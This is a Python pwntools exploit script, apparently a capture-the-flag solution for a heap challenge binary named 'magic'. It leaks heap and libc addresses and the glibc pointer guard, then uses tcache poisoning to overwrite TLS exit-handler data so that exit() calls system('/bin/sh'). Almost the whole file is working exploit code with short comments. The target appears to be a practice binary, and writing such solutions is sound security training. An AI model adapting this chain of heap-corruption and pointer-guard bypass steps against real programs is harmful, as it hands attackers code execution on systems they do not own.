#!/usr/bin/env python3

from pwn import *
exe = context.binary = ELF(args.EXE or './magic', checksec = False)
libc = ELF('libc.so.6', checksec=False)

context.log_level='warning'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("localhost", 1337)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

io = start()

def i2b(idx: int):
    return str(idx).encode()

def magic_charm(magic_word=b"Alohomora"):
    io.sendlineafter(b'> ', magic_word)

def update_magic_numbers(idx: int, magic: int):
    # spells[0] = magic[0] & magic[2]
    # spells[1] = magic[1] & magic[3]
    io.sendlineafter(b'> ', i2b(1))
    io.sendlineafter(b'number: ', i2b(idx))
    io.sendlineafter(b'number: ', i2b(magic) )

def malloc(spell: bytes):
    io.sendlineafter(b'> ', i2b(2))
    io.send(spell)

def arb_read(addr):
    update_magic_numbers(2, 0xffffffffffffffff)
    update_magic_numbers(4, addr)
    set_favorite(1)
    read_favorite()
    io.recvuntil(b':::::-:')
    io.recvlines(2)
    return u64(io.recvline().split(b':-:')[1][:8])

def logleak(name: str, addr: int): print(f"[*] " + name + " = %#x" % addr)

def free(idx: int):
    io.sendlineafter(b'> ', i2b(3))
    io.sendlineafter(b'Index: ', i2b(idx))

def read_favorite():
    io.sendlineafter(b'> ', i2b(4))

def exit(): io.sendlineafter(b'> ', i2b(6))

def set_favorite(idx: int, set=True):
    io.sendlineafter(b'> ', i2b(5))
    if not set:
        io.sendlineafter(b'spell: ', i2b(idx))

def mangle(key, addr):
    return addr ^ key

def add_offset(key, off):
    return (key << 12) + off

def rol64(x, n):
    """Rotate left 64-bit integer"""
    n = n % 64
    return ((x << n) | (x >> (64 - n))) & 0xFFFFFFFFFFFFFFFF

magic_charm()

# Heap leak
malloc(b'a' * 0x47 + b'\x0a')
malloc(b'b' * 0xf7 + b'\x0a')
free(0)
update_magic_numbers(1, 0)
set_favorite(1, False)
read_favorite()
io.recvuntil(b'\x51')
io.recvline()
HEAP_KEY = u64(io.recvline().split(b'\x00' * 3)[1][1:] + b'\x00' * 3)
logleak('heap key', HEAP_KEY)

# libc leak
for i in range(9):
    malloc(b'a' * 0x107)
for i in range(2, 10):
    free(i)

LIBC_LEAK = arb_read(add_offset(HEAP_KEY, 0xb60))
libc.address = LIBC_LEAK - 0x1d3ce0
logleak('main arena leak', LIBC_LEAK)
logleak("libc leak", libc.address)
tls = libc.address - 0x3000
tls_ptr_guard = tls + 0x770
logleak("tls", tls)

ptr_guard = arb_read(tls_ptr_guard)

logleak("ptr guard", ptr_guard)

tls_target = tls + 0x6f0

tls_payload = flat(tls_target + 8)
tls_payload += flat(rol(libc.sym.system ^ ptr_guard, 0x11))
tls_payload += flat(next(libc.search(b"/bin/sh\x00")))

logleak("tls payload length", len(tls_payload))

# write inside spells[1] our fake chunk's address
update_magic_numbers(4, add_offset(HEAP_KEY, 0xb60 + 0x20))


# create fake 0x20 chunk inside 0xf0 chunk
payload = b'a' * 0x10
payload += flat(0, 0x21)
payload += b'A' * 0xc0
malloc(payload)

# Free a 0x20 size chunk to populate our freelist
malloc(b'n' * 0x18)
free(12)

# arbitrary free spells[1]
free(1)
# free 0xf0 chunk
free(11) 

# create tcache poisoning payload
needed_len = 0xe0
metadata_tampering = b'w' * 0x10
metadata_tampering += flat(0x0) + flat(0x21) # Fake chunk metadata
metadata_tampering += flat(mangle(HEAP_KEY, tls_target)) + flat(0xdeadbeef) # Fake tcache_entry->next and tcache_entry->key (its ok as long as it is not NULL)
metadata_tampering += b'r' * (needed_len - len(metadata_tampering)) # Whatever bytes to fill our needed length so our 0xf0 chunk gets allocated
malloc(metadata_tampering) # malloc a 0xf0 chunk and write the data over our fake chunk

# RCE
needed_len = 0x18
malloc(b'X' * 0x18) # Last malloc before allocating inside the stack

malloc(tls_payload)

exit()
io.interactive()
